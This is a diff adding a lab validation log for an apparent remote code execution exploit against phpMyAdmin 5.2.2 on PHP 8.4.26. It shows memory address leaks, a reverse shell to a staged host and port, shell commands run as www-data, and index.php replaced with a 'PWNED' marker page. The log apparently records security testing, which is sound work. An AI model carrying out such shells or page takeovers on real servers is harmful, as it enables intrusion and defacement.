@@ -1,0 +1,31 @@
+Validated 2026-10-25 in the local functional phpMyAdmin 5.2.2 / PHP 8.4.26 lab.
+
+Exploit:
+[*] blockers alive 148/148
+[*] reverse-shell payload staged for 192.168.65.254:4461
+leak attempt 1/3
+  cookie=600000B ptrs=3038 heap=0x72db0a200000 libphp=0x72db0be61000
+[*] firing callback attempt 1/1
+dispatch: table=0x72db0a2690d8 system=0x72db0c2c6370 cmd=b'php /tmp/s*' carrier=adopted live=0x31
+
+Listener:
+Ncat: Connection from 127.0.0.1:12434.
+www-data@00f7668c2e50:/var/www/html$ whoami
+www-data
+www-data@00f7668c2e50:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@00f7668c2e50:/var/www/html$ hostname
+00f7668c2e50
+www-data@00f7668c2e50:/var/www/html$ pwd
+/var/www/html
+
+Manual page takeover:
+- original index.php copied to index.php.bak
+- new index.php owner: www-data:www-data
+- new index.php size: 478 bytes
+- new index.php SHA-256: 3a20129250e8175aea13d0ed9cfa9a82676244561c07b88146883f3a21dfcfd2
+- original backup SHA-256: 8d216d796379ba0e4e07e870e0c1ff38707872f80ae93ffb219c9df59b16cf14
+- HTTP 200
+- NADSEC marker present: true
+- PWNED marker present: true
+- uid=33(www-data) marker present: true
